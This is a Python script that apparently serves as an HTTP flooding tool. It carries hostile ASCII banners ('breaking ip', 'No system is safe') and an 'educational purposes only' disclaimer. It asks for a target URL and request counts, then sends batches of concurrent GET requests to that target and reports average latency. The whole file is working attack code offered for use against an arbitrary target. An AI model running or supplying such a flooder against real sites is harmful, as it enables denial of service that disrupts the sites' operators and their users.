import asyncio
import time
import httpx
from colorama import Fore, Style

def show_banner():
    banner = """
   

$$\                                     $$\       $$\                           $$\           
$$ |                                    $$ |      \__|                          \__|          
$$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  $$ |  $$\ $$\ $$$$$$$\   $$$$$$\        $$\  $$$$$$\  
$$  __$$\ $$  __$$\ $$  __$$\  \____$$\ $$ | $$  |$$ |$$  __$$\ $$  __$$\       $$ |$$  __$$\ 
$$ |  $$ |$$ |  \__|$$$$$$$$ | $$$$$$$ |$$$$$$  / $$ |$$ |  $$ |$$ /  $$ |      $$ |$$ /  $$ |
$$ |  $$ |$$ |      $$   ____|$$  __$$ |$$  _$$<  $$ |$$ |  $$ |$$ |  $$ |      $$ |$$ |  $$ |
$$$$$$$  |$$ |      \$$$$$$$\ \$$$$$$$ |$$ | \$$\ $$ |$$ |  $$ |\$$$$$$$ |      $$ |$$$$$$$  |
\_______/ \__|       \_______| \_______|\__|  \__|\__|\__|  \__| \____$$ |      \__|$$  ____/ 
                                                                $$\   $$ |          $$ |      
                                                                \$$$$$$  |          $$ |      
                                                                 \______/           \__|      

    """
    print(Fore.RED + Style.BRIGHT + banner + Style.RESET_ALL)

def print_custom_banner():
    custom_banner = """
....................../´¯/) 
....................,/¯../ 
.................../..../ 
............./´¯/'...'/´¯¯`·¸ 
........../'/.../..../......./¨¯\ 
........('(...´...´.... ¯~/'...') 
.........\.................'...../ 
..........''...\.......... _.·´ 
............\..............( 
..............\.............\...
 ███▄    █  ▒█████       ██████▓██   ██▓  ██████ ▄▄▄█████▓▓█████  ███▄ ▄███▓    ██▓  ██████      ██████  ▄▄▄        █████▒▓█████ 
 ██ ▀█   █ ▒██▒  ██▒   ▒██    ▒ ▒██  ██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒   ▓██▒▒██    ▒    ▒██    ▒ ▒████▄    ▓██   ▒ ▓█   ▀ 
▓██  ▀█ ██▒▒██░  ██▒   ░ ▓██▄    ▒██ ██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██    ▓██░   ▒██▒░ ▓██▄      ░ ▓██▄   ▒██  ▀█▄  ▒████ ░ ▒▓█   
▓██▒  ▐▌██▒▒██   ██░     ▒   ██▒ ░ ▐██▓░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██    ░██░  ▒   ██▒     ▒   ██▒░██▄▄▄▄██ ░▓█▒  ░ ▒▓█  ▄ 
▒██░   ▓██░░ ████▓▒░   ▒██████▒▒ ░ ██▒▓░▒██████▒▒  ▒██▒ ░ ░▒████▒▒██▒   ░██▒   ░██░▒██████▒▒   ▒██████▒▒ ▓█   ▓██▒░▒█░    ░▒████▒
░ ▒░   ▒ ▒ ░ ▒░▒░▒░    ▒ ▒▓▒ ▒ ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░   ░▓  ▒ ▒▓▒ ▒ ░   ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ▒ ░    ░░ ▒░ ░
░ ░░   ░ ▒░  ░ ▒ ▒░    ░ ░▒  ░ ░▓██ ░▒░ ░ ░▒  ░ ░    ░     ░ ░  ░░  ░      ░    ▒ ░░ ░▒  ░ ░   ░ ░▒  ░ ░  ▒   ▒▒ ░ ░       ░ ░  ░
   ░   ░ ░ ░ ░ ░ ▒     ░  ░  ░  ▒ ▒ ░░  ░  ░  ░    ░         ░   ░      ░       ▒ ░░  ░  ░     ░  ░  ░    ░   ▒    ░ ░       ░   
         ░     ░ ░           ░  ░ ░           ░              ░  ░       ░       ░        ░           ░        ░  ░           ░  ░
                                ░ ░                                                                                              

    """
    print(Fore.GREEN + Style.BRIGHT + custom_banner + Style.RESET_ALL)

    if __name__ == "__main__":
        print("This tool is to be used for educational purposes only and I am not responsible for any illegal acts")
        show_banner()

async def send_request(url):
    async with httpx.AsyncClient() as client:
        start_time = time.time()
        print(f"Sending request to: {url}")
        await client.get(url)
        end_time = time.time()
        return end_time - start_time

async def send_request_package(url, package_size):
    tasks = []

    for _ in range(package_size):
        task = send_request(url)
        tasks.append(task)

    latencies = await asyncio.gather(*tasks)
    average_latency = sum(latencies) / package_size

    return average_latency

async def perform_requests(url, num_requests, requests_per_package):
    total_latency = 0

    for _ in range(num_requests // requests_per_package):
        average_latency = await send_request_package(url, requests_per_package)
        total_latency += average_latency

    return total_latency / (num_requests // requests_per_package)

if __name__ == "__main__":
    show_banner()
    url = input("Enter the url of the target: ")

    try:
        num_requests = int(input("Total number of requests to send: "))
        requests_per_package = int(input("Requests per package: "))
    except ValueError:
        print("Please enter valid numbers.")
        exit(1)

    loop = asyncio.get_event_loop()
    average_latency = loop.run_until_complete(perform_requests(url, num_requests, requests_per_package))
    loop.close()

    print(f"Average latency for {num_requests} requests to {url}: {average_latency:.2f} seconds")
    print_custom_banner()
